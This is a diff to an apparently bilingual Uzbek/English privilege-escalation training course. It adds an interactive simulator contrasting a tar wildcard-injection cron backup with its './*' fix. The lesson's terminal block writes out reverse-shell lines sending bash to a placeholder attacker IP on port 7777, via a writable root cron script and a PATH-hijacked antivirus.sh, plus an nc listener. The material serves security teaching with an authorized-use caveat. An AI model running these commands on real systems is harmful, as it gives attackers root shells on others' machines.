@@ -1708,6 +1708,46 @@ function SUIDPathSim(){
       React.createElement("button",{onClick:()=>{setRun("direct");setStep(-1);},style:{flex:1,padding:"9px",background:run==="direct"?A+"22":SL2,color:run==="direct"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⚡ Variant 2: foydalanuvchi qo'shish","⚡ Variant 2: add a user"))));
 }
 
+function WildcardInjectionSim(){
+  const lang=useLang();
+  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
+  const VULN=[
+    {col:BL,uz:"Root cron: cd /var/www/html && tar czf backup.tar.gz *",en:"Root cron: cd /var/www/html && tar czf backup.tar.gz *",duz:"* — shell buni papkadagi barcha fayl nomlariga kengaytiradi.",den:"* — the shell expands this to every filename in the folder."},
+    {col:AM,uz:"Foydalanuvchi ikkita maxsus nomli fayl yaratadi: --checkpoint=1 va --checkpoint-action=exec=sh rev.sh",en:"The user creates two specially-named files: --checkpoint=1 and --checkpoint-action=exec=sh rev.sh",duz:"Bu papka www-data yoki hamma uchun yoziladigan bo'lgani uchun mumkin bo'ladi.",den:"Possible because this folder is writable by www-data or everyone."},
+    {col:AM,uz:"Shell * ni kengaytirganda, tar bu fayl nomlarini HAQIQIY BAYROQ deb qabul qiladi",en:"When the shell expands *, tar interprets these filenames as REAL FLAGS",duz:"tar buyruq argumentlari va fayl nomlarini farqlay olmaydi — ikkalasi ham matn.",den:"tar can't distinguish command flags from filenames — both are just text."},
+    {col:D,uz:"☠ Cron ishga tushganda tar rev.sh skriptini bajaradi — root shell keladi",en:"☠ When cron runs, tar executes rev.sh — a root shell arrives",duz:"Arxivlash buyrug'ining o'zi kodni bajarish vositasiga aylandi.",den:"The archiving command itself became a code-execution primitive.",final:true,bad:true}
+  ];
+  const SAFE=[
+    {col:BL,uz:"Root cron: cd /var/www/html && tar czf backup.tar.gz ./*",en:"Root cron: cd /var/www/html && tar czf backup.tar.gz ./*",duz:"Bitta kichik o'zgarish: * o'rniga ./*",den:"One small change: ./* instead of *."},
+    {col:AM,uz:"Foydalanuvchi xuddi shu ikkita maxsus nomli faylni yaratadi",en:"The user creates the exact same two specially-named files",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmaydi.",den:"The attacker does nothing differently."},
+    {col:AM,uz:"./  prefiksi tufayli fayl nomlari endi «-» bilan boshlanmaydi — tar ularni oddiy nom deb biladi",en:"Thanks to the ./ prefix, the filenames no longer start with «-» — tar treats them as plain names",duz:"tar faqat «-» bilan boshlangan argumentlarni bayroq deb hisoblaydi.",den:"tar only treats arguments starting with «-» as flags."},
+    {col:A,uz:"🔒 tar ularni oddiy fayl sifatida arxivlaydi — hujum ishlamaydi",en:"🔒 tar archives them as ordinary files — the attack fails",duz:"Bitta prefiks butun inyeksiya texnikasini yo'qqa chiqaradi.",den:"One prefix neutralizes the entire injection technique.",final:true}
+  ];
+  const [run,setRun]=useState(null);
+  const [step,setStep]=useState(-1);
+  useEffect(()=>{
+    if(run==null){setStep(-1);return;}
+    const list=run==="vuln"?VULN:SAFE;
+    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
+    if(step>=list.length-1) return;
+    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
+  },[run,step]);
+  const list=run==="vuln"?VULN:run==="safe"?SAFE:null;
+  const cur=list&&step>=0?list[step]:null;
+  return React.createElement("div",{style:{margin:"14px 0"}},
+    React.createElement("div",{style:{minHeight:50}},
+      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu tar cron zaxirasini ikki yozilish shaklida sinang.","⬇ Pick a scenario — try the exact same tar cron backup written two ways.")):
+      list.map(function(s,i){ if(step<i) return null;
+        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
+          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
+          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
+    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
+      run==="vuln"?t(lang,"✗ Yalang'och *: buyruq inyeksiyasiga ochiq","✗ Bare *: open to command injection"):t(lang,"✓ ./* prefiksi: inyeksiya bloklandi","✓ ./* prefix: injection blocked")),
+    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
+      React.createElement("button",{onClick:()=>{setRun("vuln");setStep(-1);},style:{flex:1,padding:"9px",background:run==="vuln"?D+"22":SL2,color:run==="vuln"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ tar czf ... *","☠ tar czf ... *")),
+      React.createElement("button",{onClick:()=>{setRun("safe");setStep(-1);},style:{flex:1,padding:"9px",background:run==="safe"?A+"22":SL2,color:run==="safe"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 tar czf ... ./*","🔒 tar czf ... ./*"))));
+}
+
 function LessonL01(){
   const lang=useLang();
   return React.createElement("section",null,
@@ -3273,7 +3313,10 @@ function LessonL37(){
     React.createElement(H2,{num:"§4"},t(lang,"PATH-in-cron va wildcard","PATH-in-cron and wildcards")),
     React.createElement(P,null,t(lang,"Yana bir keng tarqalgan xato — o'chirilgan skriptning cron yozuvi qolib ketishi (change management muammosi). Agar skriptning to'liq yo'li ko'rsatilmagan bo'lsa (masalan antivirus.sh), cron /etc/crontab dagi PATH bo'yicha qidiradi, va biz o'sha nom bilan o'z skriptimizni yozib qo'yishimiz mumkin. Bundan tashqari, cron skriptida wildcard (*) ishlatilsa — masalan tar, 7z yoki rsync bilan — ularning joker belgilar xususiyatidan foydalanib buyruq inyeksiya qilish mumkin. Shu sababli cron ishiga bog'langan har qanday skript va vositani sinchiklab o'rganing.","Another common mistake is a leftover cron entry for a deleted script (a change-management problem). If the script's full path isn't specified (e.g. antivirus.sh), cron searches along the PATH in /etc/crontab, and we can drop our own script with that name. Also, if a cron script uses a wildcard (*) — for example with tar, 7z or rsync — you can inject commands via their wildcard handling. So carefully study any script and tool tied to a cron job.")),
     React.createElement(SlideImg,{src:"privesc/suid_s19.png",cap:"cat antivirus.sh — PATH-in-cron uchun yaratilgan teskari qobiq skripti (port 7777).",capEn:"cat antivirus.sh — a reverse-shell script created for the PATH-in-cron trick (port 7777)."}),
-    React.createElement(Terminal,null,"# Cron ishlarini ko'rish\ncat /etc/crontab\n\n# Yoziladigan root skriptiga teskari qobiq qo'shish\necho 'bash -i >& /dev/tcp/<HUJUM-IP>/7777 0>&1' >> backup.sh\n\n# Hujum mashinasida tinglovchi\nnc -lvnp 7777\n\n# PATH-in-cron: skript nomi bilan o'z faylimizni yaratamiz\necho 'bash -i >& /dev/tcp/<HUJUM-IP>/7777 0>&1' > /home/user/antivirus.sh\nchmod +x /home/user/antivirus.sh\n\n# Capability tekshiruvi\ngetcap -r / 2>/dev/null"),
+React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: wildcard inyeksiyasi","Interactive simulator: wildcard injection")),
+    React.createElement(P,null,t(lang,"§4 da tilga olingan wildcard texnikasini amalda ko'ring — xuddi shu tar cron buyrug'ini ikki yozilish shaklida sinang:","See the wildcard technique mentioned in §4 in action — try the exact same tar cron command written two ways:")),
+    React.createElement(WildcardInjectionSim),
+        React.createElement(Terminal,null,"# Cron ishlarini ko'rish\ncat /etc/crontab\n\n# Yoziladigan root skriptiga teskari qobiq qo'shish\necho 'bash -i >& /dev/tcp/<HUJUM-IP>/7777 0>&1' >> backup.sh\n\n# Hujum mashinasida tinglovchi\nnc -lvnp 7777\n\n# PATH-in-cron: skript nomi bilan o'z faylimizni yaratamiz\necho 'bash -i >& /dev/tcp/<HUJUM-IP>/7777 0>&1' > /home/user/antivirus.sh\nchmod +x /home/user/antivirus.sh\n\n# Capability tekshiruvi\ngetcap -r / 2>/dev/null"),
     eth("Cron va capability ekspluatatsiyasi tizimni o'zgartiradi — faqat o'z laboratoriyangizda yoki ruxsat berilgan pentestda sinang; teskari qobiqni afzal ko'ring, tizim yaxlitligini buzmang.","Cron and capability exploitation modify the system — only test in your own lab or an authorized pentest; prefer a reverse shell and don't break system integrity."),
     React.createElement(Quiz,{q:{uz:"Nega yoziladigan root cron skripti xavflidir?",en:"Why is a writable root cron script dangerous?"},opts:[{uz:"Chunki u internetni sekinlashtiradi",en:"Because it slows the internet"},{uz:"Chunki cron uni root imtiyozi bilan ishga tushiradi, biz esa unga o'z kodimizni qo'sha olamiz",en:"Because cron runs it with root privileges, and we can add our own code to it"},{uz:"Chunki u ko'p joy egallaydi",en:"Because it uses a lot of space"},{uz:"Chunki u parol talab qiladi",en:"Because it requires a password"}],correct:1,exp:{uz:"Cron skriptni egasi (root) imtiyozi bilan ishga tushiradi; agar biz skriptni tahrirlay olsak, qo'shgan kodimiz ham root bilan bajariladi.",en:"Cron runs the script with the owner's (root) privileges; if we can edit it, our added code also executes as root."}}));
 }
